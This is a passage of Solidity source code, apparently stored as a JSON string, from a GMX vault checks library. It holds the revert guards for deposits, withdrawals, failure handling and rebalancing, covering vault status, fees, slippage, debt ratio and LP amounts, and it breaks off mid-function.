) revert Errors.OnlyNonNativeDepositToken();\n\n    if (dp.amt == 0) revert Errors.EmptyDepositAmount();\n\n    if (dp.amt + dp.executionFee != msg.value)\n      revert Errors.DepositAndExecutionFeeDoesNotMatchMsgValue();\n  }\n\n  /**\n    * @notice Checks before token deposit\n    * @param self GMXTypes.Store\n    * @param depositValue USD value in 1e18\n  */\n  function beforeDepositChecks(\n    GMXTypes.Store storage self,\n    uint256 depositValue\n  ) external view {\n    if (self.status != GMXTypes.Status.Open)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n\n    if (self.depositCache.depositParams.executionFee < self.minExecutionFee)\n      revert Errors.InsufficientExecutionFeeAmount();\n\n    if (!self.vault.isTokenWhitelisted(self.depositCache.depositParams.token))\n      revert Errors.InvalidDepositToken();\n\n    if (self.depositCache.depositParams.amt == 0)\n      revert Errors.InsufficientDepositAmount();\n\n    if (self.depositCache.depositParams.slippage < self.minSlippage)\n      revert Errors.InsufficientSlippageAmount();\n\n    if (depositValue == 0)\n      revert Errors.InsufficientDepositAmount();\n\n    if (depositValue < MINIMUM_VALUE)\n      revert Errors.InsufficientDepositAmount();\n\n    if (depositValue > GMXReader.additionalCapacity(self))\n      revert Errors.InsufficientLendingLiquidity();\n  }\n\n  /**\n    * @notice Checks before processing deposit\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessDepositChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Deposit)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks after deposit\n    * @param self GMXTypes.Store\n  */\n  function afterDepositChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    // Guards: revert if lpAmt did not increase at all\n    if (GMXReader.lpAmt(self) <= self.depositCache.healthParams.lpAmtBefore)\n      revert Errors.InsufficientLPTokensMinted();\n\n    // Guards: check that debt ratio is within step change range\n    if (!_isWithinStepChange(\n      self.depositCache.healthParams.debtRatioBefore,\n      GMXReader.debtRatio(self),\n      self.debtRatioStepThreshold\n    )) revert Errors.InvalidDebtRatio();\n\n    // Slippage: Check whether user received enough shares as expected\n    if (\n      self.depositCache.sharesToUser <\n      self.depositCache.depositParams.minSharesAmt\n    ) revert Errors.InsufficientSharesMinted();\n  }\n\n  /**\n    * @notice Checks before processing deposit cancellation\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessDepositCancellationChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Deposit)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks before processing after deposit check failure\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessAfterDepositFailureChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Deposit_Failed)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks before processing after deposit failure's liquidity withdrawn\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessAfterDepositFailureLiquidityWithdrawal(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Deposit_Failed)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks before vault withdrawal\n    * @param self GMXTypes.Store\n\n  */\n  function beforeWithdrawChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Open)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n\n    if (!self.vault.isTokenWhitelisted(self.withdrawCache.withdrawParams.token))\n      revert Errors.InvalidWithdrawToken();\n\n    if (self.withdrawCache.withdrawParams.shareAmt == 0)\n      revert Errors.EmptyWithdrawAmount();\n\n    if (\n      self.withdrawCache.withdrawParams.shareAmt >\n      IERC20(address(self.vault)).balanceOf(self.withdrawCache.user)\n    ) revert Errors.InsufficientWithdrawBalance();\n\n    if (self.withdrawCache.withdrawValue < MINIMUM_VALUE)\n      revert Errors.InsufficientWithdrawAmount();\n\n    if (self.withdrawCache.withdrawParams.slippage < self.minSlippage)\n      revert Errors.InsufficientSlippageAmount();\n\n    if (self.withdrawCache.withdrawParams.executionFee < self.minExecutionFee)\n      revert Errors.InsufficientExecutionFeeAmount();\n\n    if (self.withdrawCache.withdrawParams.executionFee != msg.value)\n      revert Errors.InvalidExecutionFeeAmount();\n  }\n\n  /**\n    * @notice Checks before processing vault withdrawal\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessWithdrawChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Withdraw)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks after token withdrawal\n    * @param self GMXTypes.Store\n  */\n  function afterWithdrawChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    // Guards: revert if lpAmt did not decrease at all\n    if (GMXReader.lpAmt(self) >= self.withdrawCache.healthParams.lpAmtBefore)\n      revert Errors.InsufficientLPTokensBurned();\n\n    // Guards: revert if equity did not decrease at all\n    if (\n      self.withdrawCache.healthParams.equityAfter >=\n      self.withdrawCache.healthParams.equityBefore\n    ) revert Errors.InvalidEquityAfterWithdraw();\n\n    // Guards: check that debt ratio is within step change range\n    if (!_isWithinStepChange(\n      self.withdrawCache.healthParams.debtRatioBefore,\n      GMXReader.debtRatio(self),\n      self.debtRatioStepThreshold\n    )) revert Errors.InvalidDebtRatio();\n\n    // Check that user received enough assets as expected\n    if (\n      self.withdrawCache.tokensToUser <\n      self.withdrawCache.withdrawParams.minWithdrawTokenAmt\n    ) revert Errors.InsufficientAssetsReceived();\n  }\n\n  /**\n    * @notice Checks before processing withdrawal cancellation\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessWithdrawCancellationChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Withdraw)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks before processing after withdrawal failure\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessAfterWithdrawFailureChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Withdraw_Failed)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks before processing after withdraw failure's liquidity added\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessAfterWithdrawFailureLiquidityAdded(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Withdraw_Failed)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks before rebalancing\n    * @param self GMXTypes.Store\n    * @param rebalanceType GMXTypes.RebalanceType\n  */\n  function beforeRebalanceChecks(\n    GMXTypes.Store storage self,\n    GMXTypes.RebalanceType rebalanceType\n  ) external view {\n    if (\n      self.status != GMXTypes.Status.Open &&\n      self.status != GMXTypes.Status.Rebalance_Open\n    ) revert Errors.NotAllowedInCurrentVaultStatus();\n\n    // Check that rebalance type is Delta or Debt\n    // And then check that rebalance conditions are met\n    // Note that Delta rebalancing requires vault's delta strategy to be Neutral as well\n    if (rebalanceType == GMXTypes.RebalanceType.Delta && self.delta == GMXTypes.Delta.Neutral) {\n      if (\n        self.rebalanceCache.healthParams.deltaBefore < self.deltaUpperLimit &&\n        self.rebalanceCache.healthParams.deltaBefore > self.deltaLowerLimit\n      ) revert Errors.InvalidRebalancePreConditions();\n    } else if (rebalanceType == GMXTypes.RebalanceType.Debt) {\n      if (\n        self.rebalanceCache.healthParams.debtRatioBefore < self.debtRatioUpperLimit &&\n        self.rebalanceCache.healthParams.debtRatioBefore > self.debtRatioLowerLimit\n      ) revert Errors.InvalidRebalancePreConditions();\n    } else {\n       revert Errors.InvalidRebalanceParameters();\n    }\n  }\n\n  /**\n    * @notice Checks before processing of rebalancing add or remove\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessRebalanceChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (\n      self.status != GMXTypes.Status.Rebalance_Add &&\n      self.status != GMXTypes.Status.Rebalance_Remove\n    ) revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks after rebalancing add or remove\n    * @param self GMXTypes.Store\n  */\n  function afterRebalanceChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    // Guards: check that delta is within limits for Neutral strategy\n    if (self.delta == GMXTypes.Delta.Neutral) {\n      int256 _delta = GMXReader.delta(self);\n\n      if (\n        _delta > self.del"
    }
  ]
}